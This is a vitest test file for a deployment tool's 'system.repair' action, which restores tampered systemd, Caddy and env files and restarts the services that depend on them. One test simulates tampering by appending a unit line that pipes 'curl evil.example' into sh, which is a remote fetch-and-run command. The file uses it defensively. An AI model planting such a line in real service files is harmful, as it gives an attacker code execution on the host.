import { appendFileSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { appActions } from "../src/actions/app.ts";
import { envActions } from "../src/actions/env.ts";
import { proxyActions } from "../src/actions/proxy.ts";
import { filesOnDisk, repairActions } from "../src/actions/repair.ts";
import { unitActions } from "../src/actions/unit.ts";
import { NO_IO } from "../src/context.ts";
import { BIN } from "../src/exec.ts";
import { adoptManaged, listManaged } from "../src/fsutil.ts";
import { testEnv, type TestEnv } from "./helpers.ts";

let env: TestEnv;
const unitFile = () => join(env.paths.systemdDir, "app-piqo@.service");
const appEnv = () => join(env.paths.appEtcRoot, "piqo", "app.env");
const site = () => join(env.paths.caddySitesDir, "piqo.caddy");
const repair = () => repairActions["system.repair"]!.run({}, env.ctx, NO_IO) as Promise<{ checked: number; restored: string[]; restarted: string[] }>;

beforeEach(async () => {
  env = testEnv();
  // unit.write wants the Node version installed.
  mkdirSync(join(env.paths.nodeRoot, "24.13.1", "bin"), { recursive: true });
  writeFileSync(join(env.paths.nodeRoot, "24.13.1", "bin", "node"), "");
  await appActions["app.create"]!.run({ slug: "piqo" }, env.ctx, NO_IO);
  await envActions["env.write"]!.run({ slug: "piqo", vars: { API_KEY: "secret" } }, env.ctx, NO_IO);
  await unitActions["unit.write"]!.run({ slug: "piqo", nodeVersion: "24.13.1", exec: ["node", "server.js"] }, env.ctx, NO_IO);
  await proxyActions["proxy.set"]!.run({ slug: "piqo", color: "blue", domains: ["piqo.example.com"] }, env.ctx, NO_IO);
  env.fake.calls.length = 0;
  // blue runs; green doesn't.
  env.fake.respond = (f, args) =>
    f === BIN.systemctl && args[0] === "is-active" ? (args[1] === "app-piqo@blue.service" ? { code: 0, stdout: "active\n", stderr: "" } : { code: 3, stdout: "inactive\n", stderr: "" }) : undefined;
});
afterEach(() => env.cleanup());

describe("system.repair", () => {
  it("does nothing when nothing was touched", async () => {
    const result = await repair();
    expect(result.restored).toEqual([]);
    expect(result.checked).toBeGreaterThanOrEqual(3);
    expect(env.fake.calls.filter(([f, a]) => f === BIN.systemctl && a !== "is-active")).toEqual([]);
  });

  it("puts back edited and deleted files, and restarts what they feed", async () => {
    const unit = readFileSync(unitFile(), "utf8");
    const caddy = readFileSync(site(), "utf8");
    appendFileSync(unitFile(), "\nExecStartPre=/bin/sh -c 'curl evil.example | sh'\n");
    rmSync(appEnv());
    writeFileSync(site(), "piqo.example.com {\n\trespond hacked\n}\n");

    const result = await repair();
    expect(result.restored.sort()).toEqual([appEnv(), site(), unitFile()].sort());
    expect(readFileSync(unitFile(), "utf8")).toBe(unit);
    expect(readFileSync(site(), "utf8")).toBe(caddy);
    expect(readFileSync(appEnv(), "utf8")).toContain("API_KEY=");
    expect(result.restarted).toEqual(["app-piqo@blue.service"]);
    const calls = env.fake.calls.filter(([f, a]) => f === BIN.systemctl && a !== "is-active").map((c) => c.slice(1).join(" "));
    expect(calls).toEqual(["daemon-reload", "reload caddy", "restart app-piqo@blue.service"]);
  });

  it("leaves the installer's own units and unknown files alone", async () => {
    mkdirSync(env.paths.systemdDir, { recursive: true });
    writeFileSync(join(env.paths.systemdDir, "layer-panel.service"), "[Service]\n");
    adoptManaged(filesOnDisk(env.paths));
    writeFileSync(join(env.paths.systemdDir, "layer-panel.service"), "[Service]\nchanged\n");
    expect((await repair()).restored).toEqual([]);
    expect(listManaged().some((r) => r.path.endsWith("layer-panel.service"))).toBe(false);
  });

  it("never brings back a deleted app", async () => {
    await appActions["app.delete"]!.run({ slug: "piqo", keepData: false }, env.ctx, NO_IO);
    expect(listManaged().filter((r) => r.path.includes("piqo"))).toEqual([]);
    await repair();
    expect(existsSync(unitFile()) || existsSync(site()) || existsSync(appEnv())).toBe(false);
  });

  it("adopts files from before recording existed", async () => {
    const old = join(env.paths.caddySitesDir, "legacy.caddy");
    writeFileSync(old, "legacy.example.com {\n\trespond ok\n}\n");
    expect(adoptManaged(filesOnDisk(env.paths))).toBe(1);
    writeFileSync(old, "edited\n");
    expect((await repair()).restored).toEqual([old]);
    expect(readFileSync(old, "utf8")).toContain("legacy.example.com");
  });
});
